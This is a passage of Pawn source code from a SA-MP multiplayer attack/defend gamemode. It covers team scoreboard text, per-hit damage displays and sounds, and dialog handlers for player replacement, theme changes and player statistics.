								format(ScoreString[1], 256, "%s%s| %s ~r~~h~Dead %s- ~r~%d~n~", ScoreString[1], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
						}
						else if(Player[playerScores[i][player_ID]][Playing] == true)
						{
						    if(AttOnline <= 3)
								format(ScoreString[0], 256, "%s%s| %s ~r~~h~%.0f %s- ~r~%d~n~", ScoreString[0], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(AttOnline <= 6)
								format(ScoreString[1], 256, "%s%s| %s ~r~~h~%.0f %s- ~r~%d~n~", ScoreString[1], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
						}
					}
					else if(Player[playerScores[i][player_ID]][Team] == DEFENDER)
					{
					    DefOnline++;

					    if(Player[playerScores[i][player_ID]][Playing] == false && Player[playerScores[i][player_ID]][RoundDeaths] > 0)
						{
					        if(DefOnline <= 3)
								format(ScoreString[2], 256, "%s%s| %s ~b~~h~Dead %s- ~b~~h~%d~n~", ScoreString[2], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(DefOnline <= 6)
								format(ScoreString[3], 256, "%s%s| %s ~b~~h~Dead %s- ~b~~h~%d~n~", ScoreString[3], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
					    }
						else if(Player[playerScores[i][player_ID]][Playing] == true)
						{
					    	if(DefOnline <= 3)
								format(ScoreString[2], 256, "%s%s| %s ~b~~h~%.0f %s- ~b~~h~%d~n~", ScoreString[2], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(DefOnline <= 6)
								format(ScoreString[3], 256, "%s%s| %s ~b~~h~%.0f %s- ~b~~h~%d~n~", ScoreString[3], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
						}
					}
				}
			}

			TextDrawSetString(AttackerTeam[0], ScoreString[0]);
			TextDrawSetString(AttackerTeam[1], ScoreString[1]);
			TextDrawSetString(DefenderTeam[0], ScoreString[2]);
			TextDrawSetString(DefenderTeam[1], ScoreString[3]);
			TextDrawSetString(AttackerTeam[2], ScoreString[0]);
			TextDrawSetString(AttackerTeam[3], ScoreString[1]);
			TextDrawSetString(DefenderTeam[2], ScoreString[2]);
			TextDrawSetString(DefenderTeam[3], ScoreString[3]);
		}
	    if(ArenaStarted == true)
	    {
		    GetPlayerHighestScores(playerScores, 0, index -1 );
			new AttOnline, DefOnline;

			ScoreString[0] = "";
			ScoreString[1] = "";
			ScoreString[2] = "";
			ScoreString[3] = "";

			for(new i = 0; i != p; ++i)
			{
				if(IsPlayerConnected(playerScores[i][player_ID]))
				{
					if(Player[playerScores[i][player_ID]][Team] == ATTACKER)
					{
					    AttOnline++;
					    if(Player[playerScores[i][player_ID]][RoundDeaths] > 0)
						{
					    	if(AttOnline <= 3)
								format(ScoreString[0], 256, "%s%s| %s ~r~~h~Dead %s- ~r~%d~n~", ScoreString[0], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(AttOnline <= 6)
								format(ScoreString[1], 256, "%s%s| %s ~r~~h~Dead %s- ~r~%d~n~", ScoreString[1], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
						}
						else
						{
						    if(AttOnline <= 3)
								format(ScoreString[0], 256, "%s%s| %s ~r~~h~%.0f %s- ~r~%d~n~", ScoreString[0], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(AttOnline <= 6)
								format(ScoreString[1], 256, "%s%s| %s ~r~~h~%.0f %s- ~r~%d~n~", ScoreString[1], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
						}
					}
					else if(Player[playerScores[i][player_ID]][Team] == DEFENDER)
					{
					    DefOnline++;

					    if(Player[playerScores[i][player_ID]][RoundDeaths] > 0)
						{
					        if(DefOnline <= 3)
								format(ScoreString[2], 256, "%s%s| %s ~b~~h~Dead %s- ~b~~h~%d~n~", ScoreString[2], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(DefOnline <= 6)
								format(ScoreString[3], 256, "%s%s| %s ~b~~h~Dead %s- ~b~~h~%d~n~", ScoreString[3], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
					    }
						else
					 	{
					    	if(DefOnline <= 3)
								format(ScoreString[2], 256, "%s%s| %s ~b~~h~%.0f %s- ~b~~h~%d~n~", ScoreString[2], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(DefOnline <= 6)
								format(ScoreString[3], 256, "%s%s| %s ~b~~h~%.0f %s- ~b~~h~%d~n~", ScoreString[3], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], ( (Player[playerScores[i][player_ID]][RoundDeaths] > 0 && Player[i][Playing] == false) ? 0.0 : (Player[playerScores[i][player_ID]][pHealth] + Player[playerScores[i][player_ID]][pArmour])), MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
						}
					}
				}
			}

			TextDrawSetString(AttackerTeam[0], ScoreString[0]);
			TextDrawSetString(AttackerTeam[1], ScoreString[1]);
			TextDrawSetString(DefenderTeam[0], ScoreString[2]);
			TextDrawSetString(DefenderTeam[1], ScoreString[3]);
			TextDrawSetString(AttackerTeam[2], ScoreString[0]);
			TextDrawSetString(AttackerTeam[3], ScoreString[1]);
			TextDrawSetString(DefenderTeam[2], ScoreString[2]);
			TextDrawSetString(DefenderTeam[3], ScoreString[3]);
		}
 	}

	if(Health[0] > 0) {
	    if(amount > Health[0]) {
	        Damage = amount - Health[0];
	        amount = amount - Damage;
		}
	}

	new iString[200], iColor[10];

	Health[2] = (Health[0] + Health[1]) - amount;
	if(Health[2] < 0) { Health[2] = 0; iColor = "~r~"; }
	else if(Health[2] > 100) format(iColor, sizeof iColor, "%s", MAIN_TEXT_COLOUR);
	else iColor = "~r~";

	if(issuerid != INVALID_PLAYER_ID)
	{
	    if(Player[issuerid][Playing] == true && (Player[issuerid][Team] == Player[playerid][Team])) return 1;
		if(Player[issuerid][Playing] == true && Player[playerid][Playing] == false) return 1;
		if(Player[issuerid][Playing] == true && (Player[issuerid][Team] == REFEREE || Player[playerid][Team] == REFEREE)) return 1;
		
	    if(GotHit[playerid] == 0) {
			if(Health[1] == 0) {
				w0[playerid] = CreateObject(1240, 0, 0, 0, 0, 0, 0, DRAW_DISTANCE);		//heart
				AttachObjectToPlayer(w0[playerid], playerid, 0, 0, 2, 0, 0, 0);
				SetTimerEx("hidew0",1000,false,"d",playerid);
				GotHit[playerid] = 1;
			}
			else if(Health[1] > 0) {
				w0[playerid] = CreateObject(1242, 0, 0, 0, 0, 0, 0, DRAW_DISTANCE);		//armor
				AttachObjectToPlayer(w0[playerid], playerid, 0, 0, 2, 0, 0, 0);
				SetTimerEx("hidew0",1000,false,"d",playerid);
				GotHit[playerid] = 1;
			}
		}

		PlayerPlaySound(issuerid, Player[issuerid][HitSound], 0.0, 0.0, 0.0);
        PlayerPlaySound(playerid, Player[playerid][GetHitSound], 0, 0, 0);

		if(Player[issuerid][Playing] == true || Player[playerid][Playing] == true)
		{
            Player[issuerid][WeaponStat][weaponid] += floatround(amount, floatround_round);

			Player[issuerid][shotsHit]++;
			Player[issuerid][RoundDamage] += amount;
			Player[issuerid][TotalDamage] += amount;
			if(Player[issuerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[issuerid][RoundKills], MAIN_TEXT_COLOUR, Player[issuerid][RoundDamage], MAIN_TEXT_COLOUR, Player[issuerid][TotalDamage]);
			else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[issuerid][RoundKills], MAIN_TEXT_COLOUR, Player[issuerid][RoundDamage], MAIN_TEXT_COLOUR, Player[issuerid][TotalDamage]);
			PlayerTextDrawSetString(issuerid, RoundKillDmgTDmg, iString);

		}

		if(gLastHit[0][issuerid] == -1 && gLastHit[1][issuerid] != playerid && gLastHit[2][issuerid] != playerid) gLastHit[0][issuerid] = playerid;
		if(gLastHit[0][issuerid] == playerid) {
		    DamageDone[0][issuerid] += amount;
  			format(iString, sizeof(iString), "~b~%s	%s/ -%.0f ~b~%s %s(%s~h~%.0f%s)",Player[playerid][NameWithoutTag], MAIN_TEXT_COLOUR, DamageDone[0][issuerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
	        PlayerTextDrawSetString(issuerid, DoingDamage[0], iString);
			TakeDmgCD[0][issuerid] = 1;

			if(Player[issuerid][BeingSpeced] == true) {
				foreach(new i : Player) {
			        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == issuerid) {
				        PlayerTextDrawSetString(i, DoingDamage[0], iString);
				        PlayerPlaySound(i, Player[i][HitSound],0.0,0.0,0.0);
						TakeDmgCD[0][i] = 1;
						gLastHit[0][i] = i;
					}
				}
			}
		} else {
			if(gLastHit[1][issuerid] == -1 && gLastHit[2][issuerid] != playerid) gLastHit[1][issuerid] = playerid;
			if(gLastHit[1][issuerid] == playerid ) {
			    DamageDone[1][issuerid] += amount;
             	format(iString, sizeof(iString), "~b~%s	%s/ -%.0f ~b~%s %s(%s~h~%.0f%s)",Player[playerid][NameWithoutTag], MAIN_TEXT_COLOUR, DamageDone[1][issuerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
	            PlayerTextDrawSetString(issuerid, DoingDamage[1], iString);
				TakeDmgCD[1][issuerid] = 1;

				if(Player[issuerid][BeingSpeced] == true) {
				    foreach(new i : Player){
				        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == issuerid) {
							PlayerTextDrawSetString(i, DoingDamage[1], iString);
					        PlayerPlaySound(i, Player[i][HitSound],0.0,0.0,0.0);
							TakeDmgCD[1][i] = 1;
							gLastHit[1][i] = i;
						}
					}
				}
			} else {
   				DamageDone[2][issuerid] += amount;
			   	gLastHit[2][issuerid] = playerid;

	            format(iString, sizeof(iString), "~b~%s	%s/ -%.0f ~b~%s %s(%s~h~%.0f%s)",Player[playerid][NameWithoutTag], MAIN_TEXT_COLOUR, DamageDone[2][issuerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
				PlayerTextDrawSetString(issuerid, DoingDamage[2], iString);
				TakeDmgCD[2][issuerid] = 1;

				if(Player[issuerid][BeingSpeced] == true) {
				    foreach(new i : Player) {
				        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == issuerid) {
							PlayerTextDrawSetString(i, DoingDamage[2], iString);
					        PlayerPlaySound(i,Player[i][HitSound],0.0,0.0,0.0);
							TakeDmgCD[2][i] = 1;
							gLastHit[2][i] = i;
						}
					}
				}
			}
		}


		if(gLastHit[3][playerid] == -1 && gLastHit[4][playerid] != issuerid && gLastHit[5][playerid] != issuerid) gLastHit[3][playerid] = issuerid;
		if(gLastHit[3][playerid] == issuerid) {
		    DamageDone[3][playerid] += amount;

			format(iString, sizeof(iString), "~r~~h~%s	%s/ -%.0f ~r~~h~%s %s(%s~h~%.0f%s)", Player[issuerid][NameWithoutTag], MAIN_TEXT_COLOUR, DamageDone[3][playerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
        	PlayerTextDrawSetString(playerid, GettingDamaged[0], iString);
			TakeDmgCD[3][playerid] = 1;

			if(Player[playerid][BeingSpeced] == true) {
			    foreach(new i : Player) {
			        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
			        	PlayerTextDrawSetString(i, GettingDamaged[0], iString);
				        PlayerPlaySound(i,Player[i][GetHitSound],0.0,0.0,0.0);
						TakeDmgCD[3][i] = 1;
						gLastHit[3][i] = i;
					}
				}
			}

			format(DmgLabelStr[0][playerid], 128, "%s%s {FFFFFF}/ -%.0f (%s%s{FFFFFF})", TextColor[Player[playerid][Team]], Player[issuerid][NameWithoutTag], DamageDone[3][playerid], TextColor[Player[playerid][Team]], WeaponNames[weaponid]);
			format(iString, sizeof(iString), "%s\n%s\n%s", DmgLabelStr[0][playerid], DmgLabelStr[1][playerid], DmgLabelStr[2][playerid]);
   			Update3DTextLabelText(DmgLabel[playerid], -1, iString);
		} else {
			if(gLastHit[4][playerid] == -1 && gLastHit[5][playerid] != issuerid) gLastHit[4][playerid] = issuerid;
			if(gLastHit[4][playerid] == issuerid) {
			    DamageDone[4][playerid] += amount;

				format(iString, sizeof(iString), "~r~~h~%s	%s/ -%.0f ~r~~h~%s %s(%s~h~%.0f%s)", Player[issuerid][NameWithoutTag], MAIN_TEXT_COLOUR, DamageDone[4][playerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
	        	PlayerTextDrawSetString(playerid, GettingDamaged[1], iString);
				TakeDmgCD[4][playerid] = 1;

				if(Player[playerid][BeingSpeced] == true) {
				    foreach(new i : Player) {
				        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
				        	PlayerTextDrawSetString(i, GettingDamaged[1], iString);
					        PlayerPlaySound(i,Player[i][GetHitSound],0.0,0.0,0.0);
							TakeDmgCD[4][i] = 1;
							gLastHit[4][i] = i;
						}
					}
				}

				format(DmgLabelStr[1][playerid], 128, "%s%s {FFFFFF}/ -%.0f (%s%s{FFFFFF})", TextColor[Player[playerid][Team]], Player[issuerid][NameWithoutTag], DamageDone[4][playerid], TextColor[Player[playerid][Team]], WeaponNames[weaponid]);
				format(iString, sizeof(iString), "%s\n%s\n%s", DmgLabelStr[0][playerid], DmgLabelStr[1][playerid], DmgLabelStr[2][playerid]);
	   			Update3DTextLabelText(DmgLabel[playerid], -1, iString);
			} else {
			    DamageDone[5][playerid] += amount;
				gLastHit[5][playerid] = issuerid;

				format(iString, sizeof(iString), "~r~~h~%s	%s/ -%.0f ~r~~h~%s %s(%s~h~%.0f%s)", Player[issuerid][NameWithoutTag], MAIN_TEXT_COLOUR, DamageDone[5][playerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
	        	PlayerTextDrawSetString(playerid, GettingDamaged[2], iString);
				TakeDmgCD[5][playerid] = 1;

				if(Player[playerid][BeingSpeced] == true) {
				    foreach(new i : Player) {
				        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
				        	PlayerTextDrawSetString(i, GettingDamaged[2], iString);
					        PlayerPlaySound(i,Player[i][GetHitSound],0.0,0.0,0.0);
							TakeDmgCD[5][i] = 1;
							gLastHit[5][i] = i;
						}
					}
				}

				format(DmgLabelStr[2][playerid], 128, "%s%s {FFFFFF}/ -%.0f (%s%s{FFFFFF})", TextColor[Player[playerid][Team]], Player[issuerid][NameWithoutTag], DamageDone[5][playerid], TextColor[Player[playerid][Team]], WeaponNames[weaponid]);
				format(iString, sizeof(iString), "%s\n%s\n%s", DmgLabelStr[0][playerid], DmgLabelStr[1][playerid], DmgLabelStr[2][playerid]);
	   			Update3DTextLabelText(DmgLabel[playerid], -1, iString);
			}
		}
	}
	else
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_WASTED)
		{

			PlayerPlaySound(playerid, Player[playerid][GetHitSound], 0, 0, 0);

		    if(GotHit[playerid] == 0) {
				if(Health[1] == 0) {
					w0[playerid] = CreateObject(1240, 0, 0, 0, 0, 0, 0, DRAW_DISTANCE);		//heart
					AttachObjectToPlayer(w0[playerid], playerid, 0, 0, 2, 0, 0, 0);
					SetTimerEx("hidew0",1000,false,"d",playerid);
					GotHit[playerid] = 1;
				}
				else if(Health[1] > 0) {
					w0[playerid] = CreateObject(1242, 0, 0, 0, 0, 0, 0, DRAW_DISTANCE);		//armor
					AttachObjectToPlayer(w0[playerid], playerid, 0, 0, 2, 0, 0, 0);
					SetTimerEx("hidew0",1000,false,"d",playerid);
					GotHit[playerid] = 1;
				}
			}

            if(gLastHit[3][playerid] == -1 && gLastHit[4][playerid] != playerid && gLastHit[5][playerid] != playerid) gLastHit[3][playerid] = playerid;
			if(gLastHit[3][playerid] == playerid) {
			    DamageDone[3][playerid] += amount;

				format(iString, sizeof(iString), "%s-%.0f ~r~~h~%s %s(%s~h~%.0f%s)", MAIN_TEXT_COLOUR, DamageDone[3][playerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
	        	PlayerTextDrawSetString(playerid, GettingDamaged[0], iString);
				TakeDmgCD[3][playerid] = 1;

				if(Player[playerid][BeingSpeced] == true  ) {
				    foreach(new i : Player) {
				        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
				        	PlayerTextDrawSetString(i, GettingDamaged[0], iString);
					        PlayerPlaySound(i,Player[i][GetHitSound],0.0,0.0,0.0);
							TakeDmgCD[3][i] = 1;
							gLastHit[3][i] = i;
						}
					}
				}

				format(DmgLabelStr[0][playerid], 128, "{FFFFFF}-%.0f (%s%s{FFFFFF})", DamageDone[3][playerid], TextColor[Player[playerid][Team]], WeaponNames[weaponid]);
				format(iString, sizeof(iString), "%s\n%s\n%s", DmgLabelStr[0][playerid], DmgLabelStr[1][playerid], DmgLabelStr[2][playerid]);
	   			Update3DTextLabelText(DmgLabel[playerid], -1, iString);

			}
			else
			{
			    if(gLastHit[4][playerid] == -1 && gLastHit[5][playerid] != playerid) gLastHit[4][playerid] = playerid;
				if(gLastHit[4][playerid] == playerid) {
				    DamageDone[4][playerid] += amount;

					format(iString, sizeof(iString), "%s-%.0f ~r~~h~%s %s(%s~h~%.0f%s)", MAIN_TEXT_COLOUR, DamageDone[4][playerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
		        	PlayerTextDrawSetString(playerid, GettingDamaged[1], iString);
					TakeDmgCD[4][playerid] = 1;

					if(Player[playerid][BeingSpeced] == true ) {
					    foreach(new i : Player) {
					        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
					        	PlayerTextDrawSetString(i, GettingDamaged[1], iString);
						        PlayerPlaySound(i,Player[i][GetHitSound],0.0,0.0,0.0);
								TakeDmgCD[4][i] = 1;
								gLastHit[4][i] = i;
							}
						}
					}
					format(DmgLabelStr[1][playerid], 128, "-%.0f (%s%s{FFFFFF})", DamageDone[4][playerid], TextColor[Player[playerid][Team]], WeaponNames[weaponid]);
					format(iString, sizeof(iString), "%s\n%s\n%s", DmgLabelStr[0][playerid], DmgLabelStr[1][playerid], DmgLabelStr[2][playerid]);
		   			Update3DTextLabelText(DmgLabel[playerid], -1, iString);
				} else {
				    DamageDone[5][playerid] += amount;

					format(iString, sizeof(iString), "%s-%.0f ~r~~h~%s %s(%s~h~%.0f%s)", MAIN_TEXT_COLOUR, DamageDone[5][playerid], WeaponNames[weaponid], MAIN_TEXT_COLOUR, iColor, Health[2], MAIN_TEXT_COLOUR);
		        	PlayerTextDrawSetString(playerid, GettingDamaged[2], iString);
					gLastHit[5][playerid] = playerid;
					TakeDmgCD[5][playerid] = 1;

					if(Player[playerid][BeingSpeced] == true ) {
					    foreach(new i : Player){
					        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid){
					        	PlayerTextDrawSetString(i, GettingDamaged[2], iString);
						        PlayerPlaySound(i,Player[i][GetHitSound],0.0,0.0,0.0);
								TakeDmgCD[5][i] = 1;
								gLastHit[5][i] = i;
							}
						}
					}
					format(DmgLabelStr[2][playerid], 128, "-%.0f (%s%s{FFFFFF})", DamageDone[5][playerid], TextColor[Player[playerid][Team]], WeaponNames[weaponid]);
					format(iString, sizeof(iString), "%s\n%s\n%s", DmgLabelStr[0][playerid], DmgLabelStr[1][playerid], DmgLabelStr[2][playerid]);
		   			Update3DTextLabelText(DmgLabel[playerid], -1, iString);
				}
			}
		}
	}

    if(Player[playerid][Team] == ATTACKER && Player[playerid][Playing] == true) {
		format(iString, sizeof(iString), "~w~%s", Player[playerid][NameWithoutTag]);
		TextDrawSetString(AttHpLose, iString);

		TempDamage[ATTACKER] += amount;
		format(iString, sizeof(iString), "~n~  ~r~%.0f", TempDamage[ATTACKER]);
		TextDrawSetString(TeamHpLose[0], iString);


		TextDrawColor( leftRedBG , 0xFF2B2BAA );
		foreach(new i:Player)
		{
			if(Player[i][Style] == 1) TextDrawShowForPlayer(i, leftRedBG);
		}

		KillTimer(AttHpTimer);
		AttHpTimer = SetTimer("HideHpTextForAtt", 3000, false);

	} else if(Player[playerid][Team] == DEFENDER && Player[playerid][Playing] == true) {
		format(iString, sizeof(iString), "~w~%s", Player[playerid][NameWithoutTag]);
		TextDrawSetString(DefHpLose, iString);

	    TempDamage[DEFENDER] += amount;
		format(iString,sizeof(iString), "~n~  ~b~~h~%.0f", TempDamage[DEFENDER]);
		TextDrawSetString(TeamHpLose[1], iString);

        TextDrawColor( rightBlueBG , 0x2121FFAA );
		foreach(new i:Player)
		{
			if(Player[i][Style] == 1) TextDrawShowForPlayer(i, rightBlueBG);
		}

        KillTimer(DefHpTimer);
        DefHpTimer = SetTimer("HideHpTextForDef", 3000, false);
	}
	return 1;
}


public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    if(dialogid == DIALOG_REPLACE_FIRST)
	{
		if(response)
		{
			new ToAddID = -1;
			foreach(new i : Player)
			{
			    if(!strcmp(Player[i][Name], inputtext, false, strlen(inputtext)))
			    {
			        ToAddID ++;
			        REPLACE_ToAddID[playerid] = i;
			        break;
			    }
			}
			if(ToAddID > -1)
			{
			    new str[2048];
			    foreach(new i : Player)
				{
				    if(Player[i][Playing] != true)
				        continue;

					format(str, sizeof str, "%s%s\n", str, Player[i][Name]);
				}
				for(new i = 0; i < SAVE_SLOTS; i ++)
				{
					if(strlen(SaveVariables[i][pName]) > 2 && SaveVariables[i][RoundID] == Current && SaveVariables[i][ToBeAdded] == true)
					{
					    format(str, sizeof str, "%s%s\n", str, SaveVariables[i][pName]);
					}
				}
				ShowPlayerDialog(playerid, DIALOG_REPLACE_SECOND, DIALOG_STYLE_LIST, ""COL_PRIM"Player to replace", str, "Process", "Cancel");
			}
			else
				SendErrorMessage(playerid, "Player not found.");
		}
		return 1;
	}

	if(dialogid == DIALOG_REPLACE_SECOND)
	{
		if(response)
		{
		    new ToReplaceID = -1;
			foreach(new i : Player)
			{
			    if(!strcmp(Player[i][Name], inputtext, false, strlen(inputtext)))
			    {
			        ToReplaceID = i;
			        break;
			    }
			}
			if(ToReplaceID != -1)
			{
			    new ToAddID = REPLACE_ToAddID[playerid];
			    if(!IsPlayerConnected(ToAddID))
			    {
			        return SendErrorMessage(playerid, "Player is not connected anymore.");
			    }

			    if(Player[ToAddID][InDM] == true)
				{
				    Player[ToAddID][InDM] = false;
					Player[ToAddID][DMReadd] = 0;
				}

				if(Player[ToAddID][InDuel] == true)
					return SendErrorMessage(playerid,"That player is in a duel.");  //duel

		        Player[ToAddID][AntiLag] = false;

				if(Player[ToAddID][LastVehicle] != -1)
				{
					DestroyVehicle(Player[ToAddID][LastVehicle]);
					Player[ToAddID][LastVehicle] = -1;
				}

				if(Player[ToAddID][Spectating] == true)
					StopSpectate(ToAddID);

				SetTimerEx("OnPlayerReplace", 1000, false, "iii", ToAddID, ToReplaceID, playerid);
			}
			else
			{
			    for(new i = 0; i < SAVE_SLOTS; i ++)
				{
					if(strlen(SaveVariables[i][pName]) > 2 && !strcmp(SaveVariables[i][pName], inputtext, false, strlen(inputtext)) && SaveVariables[i][RoundID] == Current)
					{
					    ToReplaceID = i;
						break;
					}
				}
				if(ToReplaceID > -1)
				{
				    new ToAddID = REPLACE_ToAddID[playerid];
				    if(!IsPlayerConnected(ToAddID))
				    {
				        return SendErrorMessage(playerid, "Player is not connected anymore.");
				    }

					if(Player[ToAddID][InDM] == true)
					{
					    Player[ToAddID][InDM] = false;
						Player[ToAddID][DMReadd] = 0;
					}

					if(Player[ToAddID][InDuel] == true)
						return SendErrorMessage(playerid,"That player is in a duel.");  //duel

					Player[ToAddID][AntiLag] = false;

					if(Player[ToAddID][LastVehicle] != -1)
					{
						DestroyVehicle(Player[ToAddID][LastVehicle]);
						Player[ToAddID][LastVehicle] = -1;
					}

					if(Player[ToAddID][Spectating] == true)
						StopSpectate(ToAddID);
					SetTimerEx("OnPlayerInGameReplace", 1000, false, "iii", ToAddID, ToReplaceID, playerid);
				}
				else
					SendErrorMessage(playerid, "Player not found.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_THEME_CHANGE1)
	{
	    if(response)
	    {
	        ThemeChange_listitem[playerid] = listitem;
	        ShowPlayerDialog(playerid, DIALOG_THEME_CHANGE2, DIALOG_STYLE_MSGBOX, "Caution: server needs restart", "The server needs to be restarted now for the changes to be\ncompletely applied. Restart now or cancel everything?", "Restart", "Cancel");
	    }
	    return 1;
	}
	if(dialogid == DIALOG_THEME_CHANGE2)
	{
	    if(response)
	    {
	        ChangeTheme(playerid, ThemeChange_listitem[playerid]);
	    }
	    else
	        ThemeChange_listitem[playerid] = -1;
	    return 1;
	}
	if(dialogid == PLAYERCLICK_DIALOG)
	{
	    if(response)
        {
            if(listitem == 0)
            {
                if(!IsPlayerConnected(LastClickedPlayer[playerid]))
                    return 1;

                new statsSTR[6][300], namee[60], CID, Country[128];
			    CID = LastClickedPlayer[playerid];

				format(namee, sizeof(namee), "{FF3333}Player {FFFFFF}%s {FF3333}Stats", Player[CID][Name]);
				GetPlayerCountry(CID, Country, sizeof(Country));

				new TD = Player[CID][TotalDeaths];
				new RD = Player[CID][RoundDeaths];
				new MC = Player[playerid][ChatChannel];
				new YC = Player[CID][ChatChannel];
				
                GetPlayerFPS(CID);
				format(statsSTR[0], sizeof(statsSTR[]), "{FF0000}- {FFFFFF}Country: %s\n\n{FF0000}- {FFFFFF}Round Kills: \t\t%d\t\t{FF0000}- {FFFFFF}Total Kills: \t\t%d\t\t{FF0000}- {FFFFFF}FPS: \t\t\t%d\n{FF0000}- {FFFFFF}Round Deaths: \t%.0f\t\t{FF0000}- {FFFFFF}Total Deaths: \t\t%d\t\t{FF0000}- {FFFFFF}Ping: \t\t\t%d\n",Country,  Player[CID][RoundKills],Player[CID][TotalKills], Player[CID][FPS], RD, TD, GetPlayerPing(CID));
				format(statsSTR[1], sizeof(statsSTR[]), "{FF0000}- {FFFFFF}Round Damage: \t%.0f\t\t{FF0000}- {FFFFFF}Total Damage:   \t%.0f\t\t{FF0000}- {FFFFFF}Packet-Loss:   \t%.1f\n\n{FF0000}- {FFFFFF}Player Weather: \t%d\t\t{FF0000}- {FFFFFF}Chat Channel: \t%d\t\t\t{FF0000}- {FFFFFF}In Round: \t\t%s\n",Player[CID][RoundDamage],Player[CID][TotalDamage], GetPlayerPacketLoss(CID), Player[CID][Weather], (MC == YC ? YC : -1), (Player[CID][Playing] == true ? ("Yes") : ("No")));
